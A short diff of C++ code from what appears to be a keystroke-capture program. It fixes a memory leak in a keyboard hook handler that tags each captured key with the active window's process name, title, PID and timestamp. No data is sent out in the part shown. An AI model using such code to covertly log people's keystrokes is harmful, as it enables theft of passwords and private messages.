@@ -51,9 +51,12 @@ void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 		PaquetKeys *tmp = new PaquetKeys();
 
 		std::string fullActiveName;
-		fullActiveName = *SelfUtils::getNameFromPID(SelfUtils::getActiveWindowPID()) + " - "
-			+ *SelfUtils::getActiveWindowTitle();
+		std::string *activeNamePtr;
+
+		activeNamePtr = SelfUtils::getNameFromPID(SelfUtils::getActiveWindowPID());
+		fullActiveName = *activeNamePtr + " - " + *SelfUtils::getActiveWindowTitle();
 		tmp->setActive(fullActiveName);
+		delete activeNamePtr;
 
 		tmp->setDate(SelfUtils::secondsSinceEpoch());
 		tmp->setPid(SelfUtils::getActiveWindowPID());
